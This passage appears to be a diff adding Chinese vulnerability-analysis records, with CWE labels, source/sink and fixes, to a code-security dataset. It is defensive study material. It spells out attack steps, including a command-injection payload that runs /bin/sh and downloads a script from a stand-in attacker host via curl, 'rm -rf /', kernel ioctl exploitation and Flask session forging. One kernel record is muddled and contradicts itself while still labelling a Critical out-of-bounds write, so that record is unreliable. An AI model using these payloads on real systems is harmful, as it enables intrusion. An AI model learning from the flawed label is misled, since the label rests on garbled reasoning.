+残余点（非内存安全漏洞）：a) 第 36 行 open(m_path) 到第 51 行 read 之间对 /tmp 世界可写路径存在 TOCTOU/symlink 竞态（CWE-367 形态），但目标路径硬编码为普通文件读取、需本地攻击者抢先布链，影响限于读错文件内容；b) main 第 66 行未检查第二次 reload 返回值即继续，若文件被删则 data() 为空指针交由第 65-67 行流程处理（size() 返回 0，安全）。
+互斥锚句：非 CWE-415，因为所有 free 点（第 24、53、16 行）均受"非空判断+置空"配对保护，任意执行序列下同一指针不会被 free 两次；非 CWE-416，因为 free 后指针即置 nullptr，无悬垂引用被后续解引用。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 每处 free 均与判空和置 nullptr 配对，reload 失败路径完整重置状态，注释宣称的 double free 在代码事实中不可达；非 CWE-415 因为不存在同一非空指针被二次释放的执行序列。
+fix_suggestion: no fix needed。可选加固：第 36 行改用 open(path, O_RDONLY | O_NOFOLLOW) 消除 /tmp 符号链接竞态；main 第 66 行检查 reload() 返回值后再使用数据。
+
+redistill-line-153
+分析过程:
+入口枚举：非 HTTP source 为 ioctl 系统调用参数 arg 指向的用户态内存（第 35 行 copy_from_user），rio.buf_len 与 rio.buf 内容完全由用户态攻击者控制；设备节点可被本地非特权进程打开即达。
+第 35-38 行 copy_from_user(&rio, ..., sizeof(rio))：整结构拷入内核栈 rio，本身有界，无缺陷。
+防御逐段核验：第 40-43 行 if (rio.buf_len > MAX_REG_BUF) ret = -EINVAL;——核验结论——不完整防御。buf_len 为 unsigned int（第 13 行），仅做 > 128 上界检查，漏掉 buf_len == 0 之外的语义没问题，但关键缺口是：该检查放行了 buf_len ≤ 128？否——真正缺口在检查与消费点之间无契约传递：drv_prepare_data（第 19-25 行）内部直接以 rio->buf_len 为循环上界写 dst[i]，而 dst 是调用方栈上 char stack_buf[MAX_REG_BUF]（第 30 行）。一旦任何其他调用路径（或未来重构）未经第 40 行检查即调用，或 buf_len 在检查后被并发改写（此处 rio 已在内核栈、mutex 持锁，改写不成立），循环即越界。就当前唯一路径逐字核验：第 40 行确实拦截 buf_len > 128，循环写 dst[0..buf_len-1] 最大 128 字节 = stack_buf 容量，写本身不越界。
+但第 44 行 copy_to_user((void __user *)rio.buf, stack_buf, rio.buf_len)：核验结论——致命缺陷。rio.buf 是随 copy_from_user 一并拷入的用户态地址值（第 14 行结构内嵌 char buf[128] 被当作指针语义使用）：内核把用户可控的 128 字节数组首元素reinterpret为 void __user * 目标地址，等于允许攻击者指定任意用户地址作为写回目的地；更严重的是该"地址"实为内核栈上 rio.buf 数组的内容字节，攻击者可将 buf 前 8 字节填成任意值 → copy_to_user 向任意用户地址写 buf_len 字节内核栈数据（信息泄露），且绕过了"结果应写回 arg 结构"的设计意图。同时第 41 行注释自证的"内部未复核"使 drv_prepare_data 成为纵深缺失点：防御只在调用侧单点存在（第 40 行），函数自身对 dst 容量零感知（第 22 行循环无界约束），属 CWE-787 的结构性温床。
+利用可行性：本地攻击者 open 设备 → ioctl(DRV_IOCTL_READ_REG) 传 buf_len ≤ 128、buf 前 8 字节 = 目标用户地址 → 内核将 stack_buf 内容（含 XOR 变换后的用户数据与相邻栈字节）写至指定地址/泄露栈布局；若维护者按注释移除或绕过第 40 行检查（该检查与 sink 跨函数分离，重构极易丢失），buf_len = 0xFFFFFFFF 即直接内核栈溢出 → 本地提权。
+互斥锚句：非 CWE-190，因为 buf_len 的 > MAX_REG_BUF 比较在无符号域直接成立、无回绕参与；非 CWE-200 单独成因，因为核心缺陷是用户可控地址/长度进入内核写路径且跨函数边界检查未内聚（787 族结构），泄露只是其后果之一。
+has_vulnerability: true
+vulnerability_type: CWE-787 Out-of-bounds Write
+risk_level: Critical
+source: line 35: copy_from_user(&rio, (void __user *)arg, sizeof(rio)) 引入用户控制的 rio.buf_len 与 rio.buf
+sink: line 22: dst[i] = (char)(rio->buf[i] ^ 0xA5); 循环上界完全依赖调用侧单点检查；line 44: copy_to_user((void __user *)rio.buf, stack_buf, rio.buf_len) 以用户可控地址值作写回目标
+explanation: buf_len 的边界防御只存在于 ioctl 分发层单点且未随参数契约传入 drv_prepare_data，写回阶段又把结构内嵌数组当作用户指针使用，构成内核栈越界写与任意地址写回的提权路径；非 CWE-190 因为无符号比较无回绕，缺陷是校验不内聚与指针语义误用。
+fix_suggestion: 第 19-25 行为 drv_prepare_data 增加 dst_len 参数并在循环前复核 rio->buf_len <= dst_len（纵深防御内聚到消费点）；第 44 行改为 copy_to_user((void __user *)arg + offsetof(struct reg_io, buf), stack_buf, rio.buf_len)，禁止把结构内容当指针；第 40 行检查保留并对 buf_len == 0 显式短路。
+
+redistill-line-1542
+分析过程:
+入口枚举：非 HTTP source 为命令行参数 argv[1]（第 52 行）经 write_log(argv[1], LOG_INFO)（第 54 行）流入日志内容；日志路径为硬编码常量（第 9 行），无外部可控文件入口。
+防御逐段核验：第 37 行 snprintf(log_entry, sizeof(log_entry), "[%s] %sn", level_str, msg)——对缓冲溢出有效：写入被钳制在 128 字节内，超长 msg 截断而非越界，CWE-120 路径闭合。第 22-34 行 switch(level) 全部映射到固定字面量，level_str 无注入面。第 39-45 行 fopen(log_path, "a") 追加模式 + 失败即 return，无覆写/命令执行 sink。
+缺陷核验：msg（含 argv[1]）未做任何输出中和——换行、ANSI 转义、终端控制序列原样进入第 45 行 fputs(log_entry, fp) 落盘。攻击者执行 ./app $'fake entryn[ERROR] admin logged in' 即可在日志中伪造整行记录（CWE-117 日志注入），污染审计链、误导后续人工/自动日志分析；若日志被终端工具 cat/tail 查看，未净化的 OSC/ANSI 序列另触及 CWE-150 近邻面。
+利用可行性：本地即可复现（argv 直接可控），影响限于日志完整性与查看端呈现，不产生代码执行、不越权、不泄露既有秘密——影响面有限。
+次级核验：第 9 行硬编码 /var/log/app/default.log 无用户输入参与，非 CWE-22/73；main 的 argc 分支（第 51-57 行）保证空参走固定文案，无空指针解引用。
+互斥锚句：非 CWE-78/77，因为 msg 只进入 snprintf/fputs 数据流，不存在系统命令或解释器 sink；非 CWE-120，因为第 37 行 snprintf 已完备钳制长度；非 CWE-22/73，因为路径不可外部控制。
+has_vulnerability: true
+vulnerability_type: CWE-117 Improper Output Neutralization for Logs
+risk_level: Low
+source: line 52: if (argc > 1) 分支下的 argv[1]（命令行参数，外部可控）
+sink: line 45: fputs(log_entry, fp) 未中和的换行/控制字符原样写入日志文件
+explanation: 命令行输入经 snprintf 截断后未做换行与控制字符中和即落盘日志，可伪造日志行污染审计记录；非 CWE-120 因为第 37 行 snprintf 已完备限制写入长度，溢出路径不存在。
+fix_suggestion: 第 37 行之前对 msg 做输出中和：将 r/n 转义为字面 r/n、剥离或转义 ESC(0x1B) 控制序列（可写 sanitize_for_log() 辅助函数）；第 9 行日志路径改由配置指定并校验目录属主，降低符号链接改写风险。
+
+redistill-line-1587
+分析过程:
+入口枚举：非 HTTP source 为配置文件 /etc/myapp/config.json（第 4 行常量路径，第 15/45 行 json.load 读入）与文件系统 mtime 信号（第 35 行 os.path.getmtime）；无网络入口。
+数据流核验：第 15 行 self._config = json.load(f) 仅解析纯数据 JSON——非反序列化器（无 pickle/eval），CWE-502 不成立；第 47-48 行 get() 只做字典读取，配置值未进入任何命令/SQL/路径 sink（第 65-66 行仅打印 db_host），无注入面。
+注释宣称缺陷核验（第 69 行"错误：在close之后再调用reload"）：close()（第 50-55 行）的实际语义仅是 self._watcher = None + 打印，不释放任何文件句柄、不停止线程——with open 在第 45-46 行已即时关闭句柄，故第 70 行 loader.reload() 是对已关闭"资源"的普通重读，无 use-after-free/UAF 等价形态（Python 层无悬垂内存），注释属防御迷惑，判定以代码事实为准。
+真实并发形态核验：第 23-27 行 threading.Thread(target=self._watch_loop); t.daemon = True; t.start() 后线程不可停止（_watch_loop 第 30-41 行 while True 无退出事件），close() 置 None 只是丢弃引用——主线程第 70 行 reload() 与监控线程第 38 行 self.reload() 可并发执行。逐段评估后果：self._config = json.load(f) 是单次名字重绑定，CPython 下引用赋值原子，读侧 get() 要么见旧字典要么见新字典，无撕裂状态；两线程各自的 with open 独立句柄，无共享 fd 竞争。最坏后果为重复解析浪费、或文件被并发删除时 reload()（第 45-46 行无 try 包裹）抛 FileNotFoundError/JSONDecodeError 使调用方或监控线程异常终止——可用性/健壮性问题。
+互斥锚句：非 CWE-362 漏洞级成因，因为竞态双方对共享状态的操作是原子重绑定、无损坏窗口可利用；非 CWE-672，因为 close 未真正释放资源，"释放后使用"前提不存在；非 CWE-502，因为 json.load 是纯数据解析。
+利用可行性：无攻击者动作可将其转化为机密性/完整性影响——缺少可控输入到危险 sink 的通路，仅有自我 DoS 形态的异常传播。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: close 仅置空引用未释放资源，reload 重读为原子字典重绑定，监控线程竞态无损坏窗口且 JSON 解析为纯数据流，注释宣称的"关闭后使用"在代码事实中不构成安全缺陷；非 CWE-362 因为共享状态更新原子、无可利用交错。
+fix_suggestion: no fix needed。可选加固：引入 threading.Event 停止标志使 close() 真正终止 _watch_loop 并 join()；第 45-46 行 reload() 增加 try/except 与内容校验（schema 白名单），防止畸形配置导致线程崩溃或脏配置生效。
+
+##### redistill-line-165
+分析过程:
+line 10-15: #define IOCTL_CMD _IOW('v', 1, struct ioctl_arg) 与 struct ioctl_arg { size_t len; char data[256]; }——唯一入口是 ioctl，用户可控字段为 len（0..255 语义上任意 size_t）与 data。
+line 26-27: if (copy_from_user(&user_arg, (void __user *)arg, sizeof(user_arg)))——整个结构体被拷入内核栈，user_arg.len 完全受用户控制，构成 source。
+line 31-33: if (user_arg.len > buf_size) { ret = -EINVAL; goto out; }——防御点①：长度上限校验。核验：buf_size 是 line 19 的静态变量 static size_t buf_size = 128;，全模块无任何写点（无 second-stage 修改、无 sysfs/procfs 暴露、ioctl 分支也不改它），而 line 46 kernel_buf = kmalloc(buf_size, GFP_KERNEL); 用同一变量分配——校验上限与堆分配大小恒等（128），故 line 35 memcpy(kernel_buf, user_arg.data, user_arg.len); 最多写满 128 字节，恰好不越界。防御有效。
+line 29 / line 41: mutex_lock(&drv_lock) … mutex_unlock(&drv_lock)——防御点②：串行化，防止并发 ioctl 交错；即便存在 buf_size 动态变化也不会在 check 与 memcpy 之间被改。有效。
+line 46-48: kernel_buf = kmalloc(buf_size, GFP_KERNEL); if (!kernel_buf) return -ENOMEM;——分配失败时 init 返回错误、模块不加载，drv_ioctl 不可达，因此不存在 kernel_buf==NULL 时的解引用路径。
+line 57: kernel_buf = NULL;  // 第52行：防御——释放后置NULL——防御点③：仅在模块卸载时生效，与本 ioctl 路径无关；卸载后字符设备已注销，不构成额外攻击面。
+利用可行性：要越界写需满足 user_arg.len > 128，但 line 31 直接拒绝；data 在结构体内最多 256 字节且 copy_from_user 按 sizeof 拷贝，无法借 len 谎报扩大读源。最小利用路径不存在。残留弱点（非漏洞）：line 30 的 if (cmd == IOCTL_CMD) 判定发生在 copy_from_user 之后（多余拷贝）；line 35 前无 kernel_buf NULL 复查，属脆弱写法但当前不可达。
+互斥锚句：非 CWE-787/CWE-120 堆溢出，因为写入长度被与分配大小同源且不可变的 buf_size 严格钳制；非 CWE-416，因为释放仅发生在模块退出且设备随之注销。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: ioctl 传入的 user_arg.len 在 line 31 被与 kmalloc 大小同源的静态 buf_size 比较并拒绝超限值，line 35 的 memcpy 因此不可能越界；非 CWE-787 因为长度上界与分配大小恒等，非 CWE-416 因为释放在模块卸载后设备已不可达。
+fix_suggestion: no fix needed。加固建议：将 line 31 的比较对象改为记录实际分配大小的独立常量并在 line 35 前增加 if (!kernel_buf) { ret = -ENODEV; goto out; }，同时把 cmd 判定提前到 copy_from_user 之前，避免未来若 buf_size 变为可写时校验与分配脱钩。
+
+redistill-line-1665
+分析过程:
+line 9-18: def load_config(self, filepath) 内 line 16 ConfigManager.register(self, filepath)——把 loader 实例引用写入类级全局字典；source 是调用方传入的 filepath 与 loader 生命周期本身。
+line 31-36: class ConfigManager: _instances = {} 与 cls._instances[path] = loader——强引用、进程级、无任何弱引用包装（无 weakref）、注释自认"不检查loader是否已被unload"。
+line 20-24: def unload_config(self, filepath) 只做 del self._cache[filepath]（line 22）并 self._loaded_files.append(filepath)（line 24）——防御缺口：没有任何 ConfigManager.unregister(path) 调用，全局字典条目在"卸载"后依旧存活。
+line 38-40: get_loader(cls, path): return cls._instances.get(path)——"释放后"仍返回对象引用。
+line 42-55: main 流程 line 46 loader.load_config(path) → line 48 loader.unload_config(path) → line 51 cached_loader = ConfigManager.get_loader(path) → line 54 data = cached_loader._cache.get(path)。核验"UAF"叙事：Python 中 _cache 是普通 dict，dict.get 对缺失键返回 None，对象仍被 _instances 强引用而存活——不存在悬垂指针解引用、无崩溃、无内存破坏。因此真正的代码事实是：对象本应在 unload 后变为可回收，却因 line 35 的全局强引用被无限期钉住。
+逐次核验：line 7 self._loaded_files = [] 与 line 24 的 append 使路径字符串也永不释放；每对 load/unload 循环都会在 _instances 与 _loaded_files 中留下不可回收条目（同一 path 会覆盖字典项，但不同 path 持续累积）。
+利用可行性：无需攻击者控制内容，仅需本地调用方反复以不同路径 load→unload（例如按请求生成的临时配置路径），即可让常驻内存单调增长，最终耗尽进程内存形成 DoS；最小动作序列 = 循环调用 load_config(p_i) + unload_config(p_i)。
+互斥锚句：非 CWE-416（Use After Free），因为 Python 有 GC 且 line 54 访问的是仍被强引用的存活对象，不存在释放后内存复用；非 CWE-915，因为 _cache/_instances 的键虽来自调用方但均为字面字符串键，未出现属性链/dunder 深键写入共享对象的污染语义；非 CWE-404，因为资源确有显式释放动作（line 22），缺的是全局注册表侧的解注册。
+has_vulnerability: true
+vulnerability_type: CWE-401 Missing Release of Memory after Effective Lifetime
+risk_level: Low
+source: line 9: load_config(self, filepath) 接收调用方可控路径，并在 line 16 触发全局注册
+sink: line 35: cls._instances[path] = loader 将 loader 强引用永久存入类级字典，且 unload 路径无对应解注册
+explanation: unload_config 仅清理自身 _cache（line 22）却从不撤销 line 16/line 35 写入 ConfigManager._instances 的强引用，导致对象生命周期被全局注册表无限延长、内存单调增长；非 CWE-416 因为 line 54 访问的是被强引用钉住的存活对象而非已释放内存。
+fix_suggestion: 在 line 24 之后补 ConfigManager.unregister(filepath)，并在 ConfigManager 中新增 @classmethod def unregister(cls, path): cls._instances.pop(path, None)；或将 line 35 改为 cls._instances[path] = weakref.ref(loader)，同时在 line 24 移除对 _loaded_files 的无限追加（改为有界 deque）。
+
+redistill-line-218
+分析过程:
+line 45-48: private: int* data_; size_t size_; std::mutex mtx_;——共享状态三元组，析构与访问都围绕它们。
+line 10-13: ~SharedBuffer() { std::lock_guard<std::mutex> lock(mtx_); delete[] data_; }——防御点①：析构时持锁。核验：锁只保证析构瞬间没有其他成员函数正在临界区内，但没有把 data_ 置 nullptr、也没有把 size_ 清零，对象进入"已释放但仍宣称有效"的矛盾状态。
+line 35-38: int read(size_t index) { lock; if (index >= size_) return -1; return data_[index]; }——防御点②：边界检查。核验：其正确性完全依赖 size_ 与 data_ 的一致性；析构后 size_ 仍为 100/50，边界检查会通过，随后 line 37 对已 delete[] 的堆块解引用。防御在生命周期终点失效。
+line 40-44: write 同理，line 43 data_[index] = value; 构成释放后写原语（比读更严重，可覆盖被复用堆块的内容）。
+line 24-31: resize 在锁内 delete[] data_; data_ = new int[new_size]; size_ = new_size;——这是正确写法（同一临界区内更新指针与长度），恰好反衬析构函数的遗漏：析构缺少 line 12 之后的 data_ = nullptr; size_ = 0;。
+line 51-68: writer_thread / reader_thread 均通过引用调用成员函数，全部走 mtx_ 保护；line 73-78: t1.join(); t2.join(); 在 return 0; 之前完成，故本 main 内析构发生在两线程结束之后，当前不可触发。
+利用可行性：缺陷是类契约级的——任何在析构后仍持有 SharedBuffer&/指针并调用 read/write 的调用方（例如把 buf 交给未 join 的 detach 线程、或回调/定时器晚于对象销毁触发）都会命中 line 37/line 43 的 UAF；最小路径 = 线程内保存引用 → 主线程析构对象 → 线程调用 buf.write(0, 0x41414141)。缺的是"析构与并发访问重叠"这一调度前提，本样本 main 未提供，故不记 Critical。
+互斥锚句：非 CWE-362（单纯数据竞争），因为所有成员函数与析构都持同一把 mtx_，不存在无锁并发访问；缺陷是生命周期终点状态不一致而非缺锁。非 CWE-415（Double Free），因为 delete[] 在 line 12/18/28 各处均处于互斥路径且 line 17-19、line 27-29 有 nullptr 判定，无重复释放。非 CWE-787，因为越界来自对象已死而非索引失控（line 36 的 index >= size_ 本身正确）。
+has_vulnerability: true
+vulnerability_type: CWE-416 Use After Free
+risk_level: Medium
+source: line 73-74: std::thread t1(writer_thread, std::ref(buf)); 与 line 75 的 t2——外部线程长期持有 SharedBuffer&，其访问时机不受对象生命周期约束
+sink: line 37: return data_[index];（以及 line 43: data_[index] = value;）在析构 line 12 delete[] data_; 之后仍会对已释放堆块解引用
+explanation: 析构函数在锁内 delete[] data_（line 12）却不将 data_ 置空、size_ 清零，使 line 36/line 42 的边界检查在对象已死后依然放行，任何析构后的 read/write 都变成释放后读写；非 CWE-362 因为临界区互斥完整、非 CWE-415 因为不存在重复 delete。
+fix_suggestion: 在 line 12 之后补 data_ = nullptr; size_ = 0;，并在 line 36、line 42 的检查改为 if (data_ == nullptr || index >= size_) return -1;（write 直接 return）；更彻底的做法是 line 45 将 int* data_ 换成 std::unique_ptr<int[]> 或 std::vector<int>，并用 std::shared_ptr<SharedBuffer> 传递线程所有权，使生命周期由引用计数保证。
+
+redistill-line-227
+分析过程:
+line 10-11: #define IOCTL_FREE 0x1001 / #define IOCTL_USE  0x1002——两个 ioctl 命令构成全部攻击面入口（line 60 .unlocked_ioctl = dev_ioctl）。
+line 22: mutex_lock(&lock);   // line 20——防御点①：整个 switch 处于单一互斥区内，line 42 mutex_unlock(&lock); 收尾。核验：FREE 与 USE 无法并发交错，因此"kfree 与 buffer[0]='A' 同时发生"的竞态被排除；这是有效防御。
+line 25-27: kfree(buffer);               // line 25 / buffer_allocated = 0;        // line 26 / // 注意：buffer 指针未置 NULL——释放后 buffer 成为悬垂指针（stale pointer），状态位被清零。
+line 31-35: case IOCTL_USE: if (buffer_allocated) {          // line 32 → buffer[0] = 'A';             // line 33 → else { ret = -EFAULT;               // 防御：未分配时拒绝 }——防御点②：以 buffer_allocated 作为唯一使用门。核验有效性：该标志的全部写点为 line 26（置 0）、line 50（置 1，仅 init）、line 55（置 0，仅 exit）；读点为 line 24、line 31、line 53。由于写点与读点都在同一把 lock 内（init/exit 除外，但那是模块装载/卸载的单线程时刻），攻击者无法在 kfree 之后让标志重新为 1——不存在 re-allocate 命令（switch 只有 FREE/USE/default），因此没有"释放→再置位→再使用"的窗口。防御在其覆盖范围内有效。
+line 40-41: default: ret = -EINVAL;——未知 cmd 被拒，无第三条路径。
+line 44-50: dev_init 中 buffer = kmalloc(128, GFP_KERNEL);      // line 46，失败返回 -ENOMEM（模块不加载，ioctl 不可达），成功则 buffer_allocated = 1;。
+line 52-56: dev_exit 中 if (buffer_allocated) { kfree(buffer); ... }——防御点③：条件释放避免 double free；若用户已调用 IOCTL_FREE，标志为 0，exit 不再释放。核验：正确，无 CWE-415。
+利用可行性：要命中 UAF 需在 buffer_allocated==0 时执行 line 33，而 line 31 的判定与之互斥且同锁；要构造 double free 需两次进入 line 25，但 line 24 的 if (buffer_allocated) 在第一次后即为假。最小利用路径不存在。另注：dev_ioctl 全程未调用 copy_from_user，arg 未被解引用，故也无任意写原语。残留弱点（非漏洞）：line 27 自认的悬垂指针是纯代码卫生问题——若日后新增 IOCTL_ALLOC 或任何绕过标志的路径，line 33 立即变成真实 UAF 写。
+互斥锚句：非 CWE-416，因为对已释放 buffer 的唯一解引用点 line 33 被同锁保护的 buffer_allocated 门（line 31）完全阻断，悬垂指针从未被使用；非 CWE-415，因为 line 24 与 line 53 的条件判定使两次 kfree 互斥；非 CWE-362，因为 FREE/USE 共享 line 22 的同一互斥区。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: IOCTL_FREE 在 line 26 将 buffer_allocated 清零，IOCTL_USE 在 line 31 以同一互斥锁保护下的该标志作为唯一放行条件，使 line 33 对已 kfree 指针的写入不可达；非 CWE-416 因为悬垂指针从未被解引用，非 CWE-415 因为 line 24/line 53 的条件释放互斥。
+fix_suggestion: no fix needed。加固建议：在 line 26 后补 buffer = NULL;，并把 line 31 的条件改为 if (buffer != NULL)（以指针本身而非旁路标志作为真值来源），同时为 dev_open 增加权限/minor 校验，避免未来新增分配命令时状态位与指针脱钩。
+
+redistill-line-235
+分析过程:
+line 3: include <linux/device.h>——缺失 #，本文件不可通过编译；这是一处代码事实，直接决定后续可达性论证的强度。
+line 9: #define BUF_SIZE 0x20          // 32 bytes；line 18-19: static struct drv_device *drv; static char *k_buf;——唯一的内核侧目标缓冲。
+line 64-80: drv_init 中 k_buf = kzalloc(BUF_SIZE, GFP_KERNEL);（line 66）、drv = kzalloc(sizeof(*drv), GFP_KERNEL);（line 70）、cdev_init(&drv->cdev, &fops);（line 77），紧接 line 78 注释 // 实际注册省略（alloc_chrdev_region 等）——没有 cdev_add、没有 device_create、没有 alloc_chrdev_region。核验：即使忽略 line 3 的编译错误，字符设备从未接入 VFS，fops（line 51-56）不会被内核调度，drv_read/drv_write 对任何用户态进程均不可达。
+line 28-49: drv_write 防御链逐段核验（假设可达）：
+  line 34-35: if (count > BUF_SIZE * 4)    // 允许大请求，但内部截断 → return -EINVAL;——上界 128，限制 line 37 temp = kmalloc(count, GFP_KERNEL); 的分配规模，杜绝大页/整数溢出（BUF_SIZE * 4 为编译期常量 128，无溢出可能）。
+  line 38-39: if (!temp) return -ENOMEM;——分配失败检查齐备。
+  line 41-44: if (COPY_FROM_USER(temp, user_buf, count)) { kfree(temp); return -EFAULT; }——拷贝失败即释放并返回，无泄漏、无部分写入 k_buf。
+  line 47: copy_len = count > BUF_SIZE ? BUF_SIZE : count;——关键钳制：copy_len ≤ min(count, 32)。
+  line 48: memcpy(k_buf, temp, copy_len);   // line 44: 潜在溢出…——核验该行注释的断言：目的 k_buf 容量 32（line 66），写入量 copy_len ≤ 32，源 temp 有效初始化为 count ≥ copy_len 字节（line 41 已完整拷贝 count），因此既无目的端越界、也无源端越界读。注释所称"temp 未初始化部分"不成立：kmalloc 未清零的尾部字节位于 count..128 之外，而 memcpy 只读前 copy_len ≤ count 字节。防御有效。
+line 22-26: drv_read 中 size_t len = count > BUF_SIZE ? BUF_SIZE : count;（line 24）后 copy_to_user(user_buf, k_buf, len)（line 25）——同样钳制在 32 字节内，无内核信息越界泄露。
+line 82-86: drv_exit 中 kfree(k_buf); kfree(drv);——无 double free（各一次）。
+利用可行性：不可利用，缺的是"设备注册"这一前提——攻击者没有任何 fd 可获取（无 /dev 节点、无 misc_register、无 chrdev 区段），故 line 48 的 memcpy 无法被外部触发。次要问题（非本样本漏洞结论依据）：line 52-56 的 static const struct file_operations fops 赋给 line 15 struct cdev cdev; 时 cdev_init 形参为 const struct file_operations *，兼容；line 66 的 k_buf 若在注册后被并发 write 访问则无锁保护，但注册缺失使该并发面同样不存在。
+互斥锚句：非 CWE-787/CWE-120，因为 line 47 的三元钳制使写入长度不超过 line 66 的 kzalloc(32) 容量；非 CWE-125，因为 line 24 同样钳制读长度；非 CWE-416，因为 k_buf 仅在 line 83 的 exit 释放一次且此前无任何 free 路径；非 CWE-190，因为所有长度运算均为编译期常量与 size_t 比较，无回绕。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: drv_write 的写入量在 line 47 被 copy_len = count > BUF_SIZE ? BUF_SIZE : count 钳制到不超过 line 66 kzalloc(BUF_SIZE) 的 32 字节容量，且 line 78 明示 cdev 注册被省略（叠加 line 3 include 缺 # 无法编译），使该路径对外完全不可达；非 CWE-787 因为长度上界与分配大小一致，非 CWE-125 因为 line 24 同样钳制读出长度。
+fix_suggestion: no fix needed。加固建议：修正 line 3 为 #include <linux/device.h>；若补齐 line 78 的注册逻辑，则必须同时为 drv_write/drv_read 增加互斥锁与 if (!k_buf) return -ENODEV; 前置检查，并把 line 34 的 BUF_SIZE * 4 上界与 line 47 的钳制统一为单一常量以避免两处上界漂移。
+
+redistill-line-3020
+分析过程:
+line 12-16: var WhitelistedCommands = map[string]bool{ "backup": true, "cleanup": true, "healthcheck": true }——白名单的键是任务名，不是可执行文件路径。
+line 20-25: type scheduledTask struct { Name string; Command string; Args []string; Schedule string }——source：Name、Command、Args 三个字段均来自调用方（line 69 注释自认 "User-supplied task definitions (simulating untrusted input)"）。
+line 28-31: runTask 的防御点①：if !WhitelistedCommands[task.Name] { return fmt.Errorf("task %q is not whitelisted", task.Name) }——核验：只校验 Name。Command 与 Args 未参与任何校验、未与 Name 绑定、无路径白名单。因此该防御对"名实分离"的输入完全无效：Name 合法 + Command 任意 = 通过。
+line 34: cmd := exec.CommandContext(ctx, task.Command, task.Args...)——sink：task.Command 直接作为可执行文件、task.Args 直接作为参数向量进入 OS 进程创建。虽然不经 shell，但当 Command 本身就是 /bin/sh 时，Args = ["-c", <任意串>] 使 shell 成为实际执行体，等价于任意命令执行。
+line 37: cmd.Shell = false——防御点②（伪防御）。核验：Go 标准库 os/exec.Cmd 没有 Shell 字段（本行无法通过编译）；即便存在，"禁用 shell 调用"也只阻止隐式 shell 包装，无法阻止攻击者把 shell 显式写在 line 34 的 Command 位上。作用位置错误 + 语义空转。
+line 40-44: output, err := cmd.CombinedOutput()——实际执行点，错误信息回传（line 43 string(output)）还会把子进程输出泄露到日志，便于攻击者做盲注式探测。
+line 51-68: scheduleTasks 为每个任务开 goroutine，line 56 ticker := time.NewTicker(1 * time.Minute) + line 62 runTask(ctx, t)——放大效应：一旦通过校验，恶意命令每分钟重复执行，且 line 55 的 goroutine 无退出条件（ctx 为 line 52 的 Background，永不 Done），构成持久化驻留。
+line 92-99: main 中的防御点③：for _, task := range userTasks { if WhitelistedCommands[task.Name] { validTasks = append(validTasks, task) } else { log.Printf("Rejected non-whitelisted task: %s", task.Name) } }——核验：与 line 29 是同一个缺陷的复制（仍只看 Name），双重校验并不提供额外保障，属"同一黑名单/白名单判据重复两次"，非纵深防御。
+line 88-92: 样本自带的恶意尝试 Name: "system('rm -rf /')", Command: "/bin/sh", Args: []string{"-c", "rm -rf /"} 恰好被 line 93 拦住——但这只证明"Name 不在表内会被拒"，不证明防御充分。
+利用可行性（最小利用路径）：提交 {Name: "backup", Command: "/bin/sh", Args: ["-c", "id > /tmp/pwn"], Schedule: "*/1 * * * *"}。line 29 查表命中 "backup" → 放行；line 93 同样命中 → 进入 validTasks；line 62 每分钟触发 line 34，/bin/sh -c "id > /tmp/pwn" 被执行。无需任何内存破坏或竞态，纯逻辑绕过。变体：Command: "/usr/bin/python3", Args: ["-c", "..."]、Command: "/usr/bin/curl", Args: ["http://attacker/x.sh","-o","/tmp/x.sh"] 均可达成落地与外联；Name 与 Command 之间不存在任何一致性约束。
+互斥锚句：非 CWE-88（Argument Injection），因为被控制的不是"固定命令的参数位"——task.Command 即程序名本身完全可控，攻击者可直接指定 /bin/sh 这类解释器，语义上等价于命令执行而非参数走私。非 CWE-94/CWE-95，因为不存在把输入拼进代码文本再求值的过程，sink 是 OS 进程创建。非 CWE-78 的 shell 元字符子型（无 shell 字符串拼接），但仍归 CWE-78：判定标准是"sink 为 OS 程序执行且外部可控"，有无 shell 层均计入，且此处 shell 由攻击者显式提供。
+has_vulnerability: true
+vulnerability_type: CWE-78 Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
+risk_level: Critical
+source: line 20-25: scheduledTask 的 Name/Command/Args 字段来自 line 69 注释标明的不可信任务定义输入
+sink: line 34: cmd := exec.CommandContext(ctx, task.Command, task.Args...) 与 line 40 cmd.CombinedOutput()——用户可控程序名与参数向量直接进入 OS 进程执行
+explanation: 白名单只比对 task.Name（line 29、line 93），而真正被执行的 task.Command/task.Args 从未受任何约束，攻击者用合法名 "backup" 搭配 Command:"/bin/sh", Args:["-c", ...] 即绕过校验并被 line 56 的定时器每分钟重复执行；非 CWE-88 因为程序名本身可控而非仅参数位，非 CWE-94/95 因为不存在代码文本拼接求值。
+fix_suggestion: 在 line 29 之后（或 line 34 之前）增加名→命令的强绑定：var allowedExec = map[string]struct{ Bin string; Args []string }{ "backup": {"/usr/bin/backup-script", []string{"--source","/data","--dest","/backup"}}, ... }，命中后忽略任务自带的 Command/Args，只用表内固定值构造 exec.CommandContext；删除 line 37 无效的 cmd.Shell = false；同时对 Args 做白名单式参数校验（拒绝以 - 开头的未知开关），并把 line 43 的错误输出截断/脱敏后
+
+##### redistill-line-3957
+分析过程:
+line 8: app.secret_key = 'super-secret-key-2024' —— Flask 会话签名密钥以字面量硬编码在源码中。该密钥是 session cookie 的唯一信任根：任何读到源码/仓库的人都能用 flask 的签名算法（itsdangerous HMAC）离线伪造任意 session cookie。
+line 19: user_id = session.get('user_id') —— 服务端无条件信任 cookie 中的 user_id（防御核验：Flask 仅校验签名完整性，签名密钥即第 8 行硬编码值，签名校验因此形同虚设，可被完全绕过）。
+line 23-26: 'SELECT id, username, is_admin FROM users WHERE id = ?', (user_id,) —— 用伪造的 user_id 查库；攻击者伪造一个 is_admin=1 的已存在管理员 id 即可。
+line 52: is_admin = user['is_admin'] == 1 —— 授权门完全由被伪造的 session 决定，第 55 行 if not (is_admin or is_self) 的 403 拦截被绕过。
+line 62-65: conn.execute('SELECT * FROM user_profiles WHERE user_id = ?', (target_user_id,)) —— 参数化查询，SQL 注入防御有效（占位符绑定，无拼接）。
